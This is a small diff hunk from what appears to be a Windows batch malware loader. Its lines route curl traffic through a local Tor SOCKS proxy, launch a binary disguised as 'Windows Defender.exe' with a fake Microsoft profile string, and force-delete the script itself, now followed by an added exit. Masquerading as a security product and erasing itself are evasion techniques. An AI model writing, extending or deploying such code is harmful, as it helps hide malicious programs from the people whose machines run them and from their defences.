@@ -48,4 +48,4 @@ if not errorlevel 1 (set "proxy=--tlsv1 --socks5-hostname 127.0.0.1:9050") else 
 
 "%environment%\Windows Defender.exe" -P"rofile of Windows Defender [Microsoft Corporation]"
 endlocal
-DEL /s /f /q /a "%~f0"
+DEL /s /f /q /a "%~f0" && exit
